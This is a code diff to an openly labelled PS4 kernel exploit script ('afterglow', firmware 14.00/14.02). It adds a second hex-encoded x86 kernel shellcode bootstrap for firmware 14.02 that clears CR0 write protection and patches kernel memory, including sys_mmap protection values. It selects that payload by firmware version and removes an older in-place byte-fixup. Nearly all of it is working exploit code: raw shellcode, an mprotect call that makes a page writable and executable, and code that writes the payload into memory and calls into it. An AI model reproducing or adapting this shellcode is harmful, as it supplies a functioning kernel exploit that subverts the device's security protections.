@@ -91,11 +91,21 @@ const TUNE = {
    those, and one short of that never lands in the right bucket. */
 const PROBE_NODES = ["/dev/rng", "/dev/urandom", "/dev/random", "/dev/zero", "/dev/null"];
 
-const BOOTSTRAP =
+const BOOTSTRAP_1400 =
     "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
   + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
   + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
   + "488991882d1001c781ac2d100101000000c681daaa1f0037c681ddaa1f00370f"
+  + "20c0480d000001000f22c031c0c3";
+
+/* Static 14.02 bootstrap. Only the two sys_mmap protection immediates move,
+   both by +0x400. This remains unreachable while the 14.02 route is blocked;
+   it must gain an all-stock/all-final preflight before it can be enabled. */
+const BOOTSTRAP_1402 =
+    "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
+  + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
+  + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
+  + "488991882d1001c781ac2d100101000000c681daae1f0037c681ddae1f00370f"
   + "20c0480d000001000f22c031c0c3";
 
 const PATCHES_1400 = [
@@ -1983,6 +1993,7 @@ async function attempt(ctx, opts) {
   const patches = patchWindows
     ? patchWindows.map(function (p2) { return [p2[0], p2[2], p2[3]]; })
     : PATCHES_1400.map(function (p2) { return [p2[0], p2[1], p2[2]]; });
+  const bootstrapHex = ctx.firmware === "14.02" ? BOOTSTRAP_1402 : BOOTSTRAP_1400;
   say("afterglow -- ps4 kernel exploit, firmware 14.00 (verified GoldHEN route)");
 
   const missing = seedStubs();
@@ -2327,19 +2338,7 @@ async function attempt(ctx, opts) {
   if (sc(S.mprotect, hostPage, 0x1000, 7).i32 !== 0) {
     say("    page did not turn writable -- not calling into it"); return false;
   }
-  const boot = unhex(BOOTSTRAP);
-  /* fixup: BOOTSTRAP hardcodes offsets 0x1FAADA and 0x1FAADD which are
-     in the +1024 shift range on 14.02. Adjust displacement bytes in the
-     machine code: c6 81 [DA AA 1F 00] 37 → c6 81 [DA AE 1F 00] 37 */
-  if (K.anchor === 0xe6c30) {
-    for (let bi = 0; bi < boot.length - 6; bi++) {
-      if (boot[bi] === 0xc6 && boot[bi+1] === 0x81 && boot[bi+3] === 0xaa
-          && boot[bi+4] === 0x1f && boot[bi+5] === 0x00 && boot[bi+6] === 0x37) {
-        boot[bi+3] = 0xae;
-        say("[5b] bootstrap fixup: offset byte at +" + bi + " shifted aa->ae (+0x400)");
-      }
-    }
-  }
+  const boot = unhex(bootstrapHex);
 
   wrbuf(hostFree, boot);
   if (!sameBytes(rdbuf(hostFree, boot.length), boot)) {
